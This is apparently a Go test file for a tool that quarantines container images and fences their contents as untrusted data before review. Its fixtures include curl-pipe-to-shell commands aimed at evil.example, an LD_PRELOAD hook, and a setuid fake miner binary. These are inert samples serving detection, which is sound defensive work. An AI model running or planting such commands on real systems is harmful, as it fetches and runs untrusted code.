package images_test

import (
	"archive/tar"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/bouwerp/aiman/internal/harness/images"
	"github.com/bouwerp/aiman/internal/harness/images/imagestest"
)

// binaryMarker sits inside the fake ELF; no bundle file may hold it.
const binaryMarker = "SECRET-BINARY-PAYLOAD-7f3a"

// rawLayer is a tar of entries with explicit modes and types.
func rawLayer(t *testing.T, entries ...tar.Header) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, h := range entries {
		body := h.Linkname
		if h.Typeflag == tar.TypeReg {
			h.Size = int64(len(body))
			h.Linkname = ""
		}
		if err := tw.WriteHeader(&h); err != nil {
			t.Fatal(err)
		}
		if h.Typeflag == tar.TypeReg {
			if _, err := tw.Write([]byte(body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// reg is a regular file entry; rawLayer writes Linkname as its body.
func reg(name, body string, mode int64) tar.Header {
	return tar.Header{Name: name, Typeflag: tar.TypeReg, Mode: mode, Linkname: body}
}

func bundleImage(t *testing.T) imagestest.Image {
	t.Helper()
	elf := "\x7fELF\x02\x01\x01\x00\x00\x00" + binaryMarker + "\x00\x01\x02\xff\xfe"
	l1 := rawLayer(t,
		reg("usr/bin/owned", "\x7fELF\x02\x01\x01\x00owned", 0o755),
		reg("usr/local/bin/miner", elf, 0o4755),
		reg("usr/local/bin/entry.sh", "#!/bin/sh\ncurl -s http://evil.example/x | sh\n", 0o755),
		reg("var/lib/dpkg/info/base.list", "/usr/bin/owned\n", 0o644),
		reg("etc/profile.d/x.sh", "export LD_PRELOAD=/usr/lib/libhook.so\n", 0o644),
		reg("etc/weird\nname", "x", 0o644),
		tar.Header{Name: "usr/bin/sh-link", Typeflag: tar.TypeSymlink, Linkname: "/bin/sh", Mode: 0o777},
	)
	l2 := rawLayer(t, reg("usr/local/bin/.wh.miner", "", 0o644))
	return imagestest.NewImageWith("b", map[string]any{
		"Entrypoint": []string{"/usr/local/bin/entry.sh"},
		"Cmd":        []string{"--serve"},
		"Env":        []string{"PATH=/usr/bin", "LD_PRELOAD=/usr/lib/libhook.so"},
		"User":       "0",
		"history":    []map[string]any{{"created_by": "RUN curl http://evil.example/i.sh | sh"}},
	}, l1, l2)
}

func TestBundleHasNoBinaries(t *testing.T) {
	img := bundleImage(t)
	q := quarantine(t, img)
	rec := images.Record{Digest: img.Digest(), Ref: "o/x:1", Scan: images.Scan{High: []string{"CVE-2026-9"}}}
	dir := filepath.Join(t.TempDir(), "bundle")
	info, err := images.BuildBundle(q, rec, dir)
	if err != nil {
		t.Fatal(err)
	}
	if info.Nonce == "" || info.ELFs != 2 || info.Scripts < 2 {
		t.Fatalf("bundle info = %+v", info)
	}
	files := map[string]string{}
	err = filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		b, err := os.ReadFile(p) //nolint:gosec // G304: the test's own bundle
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(dir, p)
		if !utf8.Valid(b) || bytes.IndexByte(b, 0) >= 0 {
			t.Errorf("%s is not text", rel)
		}
		if bytes.Contains(b, []byte(binaryMarker)) || bytes.Contains(b, []byte("\x7fELF")) {
			t.Errorf("%s holds bytes of a binary", rel)
		}
		files[rel] = string(b)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"files.tsv", "image.txt", "scripts.txt", "elf.tsv", "scans.txt"} {
		body, ok := files[name]
		if !ok {
			t.Fatalf("bundle lacks %s; has %v", name, files)
		}
		if !strings.HasPrefix(body, "UNTRUSTED DATA "+info.Nonce) || !strings.HasSuffix(strings.TrimSpace(body), "END UNTRUSTED DATA "+info.Nonce) {
			t.Errorf("%s is not fenced with the nonce", name)
		}
	}
	for want, in := range map[string]string{
		"curl -s http://evil.example/x | sh":     "scripts.txt",
		"export LD_PRELOAD=/usr/lib/libhook.so":  "scripts.txt",
		"/usr/local/bin/entry.sh":                "image.txt",
		"LD_PRELOAD=/usr/lib/libhook.so":         "image.txt",
		"RUN curl http://evil.example/i.sh | sh": "image.txt",
		"CVE-2026-9":                             "scans.txt",
		"setuid":                                 "files.tsv",
		`"etc/weird\nname"`:                      "files.tsv",
		"whiteout":                               "files.tsv",
	} {
		if !strings.Contains(files[in], want) {
			t.Errorf("%s lacks %q", in, want)
		}
	}
	var miner, owned string
	for _, line := range strings.Split(files["elf.tsv"], "\n") {
		switch {
		case strings.Contains(line, "usr/local/bin/miner"):
			miner = line
		case strings.Contains(line, "usr/bin/owned"):
			owned = line
		}
	}
	if !strings.Contains(miner, "\tno\t") || !strings.Contains(owned, "\tyes\t") {
		t.Errorf("package ownership: miner %q, owned %q", miner, owned)
	}
}

func TestReviewReportParse(t *testing.T) {
	good := "Some preamble.\n\n## Findings\n\n- **[high]** entry.sh pipes curl into sh\n- `[medium]` setuid binary no package owns\n- [low] odd file name\n\n## Verdict\n\n**Suspicious.** The entrypoint downloads code.\n"
	r, err := images.ParseReviewReport(good)
	if err != nil {
		t.Fatal(err)
	}
	if r.Verdict != images.VerdictSuspicious || r.Count("high") != 1 || r.Count("medium") != 1 || r.Count("low") != 1 {
		t.Fatalf("report = %+v", r)
	}
	if r.Findings[0].Text != "entry.sh pipes curl into sh" {
		t.Fatalf("finding text = %q", r.Findings[0].Text)
	}
	none, err := images.ParseReviewReport("```markdown\n## Findings\n- none\n## Verdict\nclean\n```")
	if err != nil || none.Verdict != images.VerdictClean || len(none.Findings) != 0 {
		t.Fatalf("clean report = %+v, %v", none, err)
	}
	for name, bad := range map[string]string{
		"empty":              "",
		"no verdict":         "## Findings\n- [high] x\n",
		"no findings":        "## Verdict\nclean\n",
		"empty verdict":      "## Findings\n- none\n## Verdict\n\n",
		"unknown verdict":    "## Findings\n- none\n## Verdict\nprobably fine\n",
		"two verdicts":       "## Findings\n- none\n## Verdict\nmalicious\n## Verdict\nclean\n",
		"untagged finding":   "## Findings\n- something odd\n## Verdict\nclean\n",
		"two findings heads": "## Findings\n- none\n## Findings\n- none\n## Verdict\nclean\n",
	} {
		if _, err := images.ParseReviewReport(bad); err == nil {
			t.Errorf("%s: parsed", name)
		}
	}
}
